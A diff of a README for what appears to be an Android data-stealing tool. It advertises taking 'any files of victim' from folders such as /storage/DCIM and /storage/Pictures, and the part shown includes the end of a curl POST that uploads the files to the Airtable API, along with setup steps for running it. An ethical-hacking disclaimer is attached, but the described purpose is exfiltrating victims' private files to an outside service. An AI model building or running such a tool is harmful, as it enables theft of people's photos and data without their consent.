@@ -11,7 +11,7 @@
 
 ## Features
 
-✓ First time on internet 😎 , Give credit if you are going to copy my code.</br>
+✓ First time on internet 😎 , Give credit if you are going to copy my idea or code ;)</br>
 ✓ You can get any files of victim 🌚</br>
 - /storage/DCIM
 - /storage/Pictures
@@ -131,9 +131,9 @@ curl -v -X POST https://api.airtable.com/v0/#baseid/#tablename \
   ]
 }'
 ```
-✓ All files uploaded through Airtable API
-✓ Change #baseid, #apikey, #tablename, #toolname and save it demo.sh
-✓ bash demo.sh [for testing]
+✓ All files uploaded through Airtable API</br>
+✓ Change #baseid, #apikey, #tablename, #toolname and save it demo.sh</br>
+✓ bash demo.sh [for testing]</br></br>
 ### Disclaimer
 The tutorial and demo provided for informational and educational purpose only, and for those who’re willing and curious to know and learn about Ethical Hacking, Security and Penetration Testing.</br></br> Any time the word “Hacking” that is used on this Application shall be regarded as Ethical Hacking.</br></br>
 You shall not misuse the information to gain unauthorised access. However you may try out these hacks on your own computer at your own risk. Performing hack attempts (without permission) on computers that you do not own is illegal.
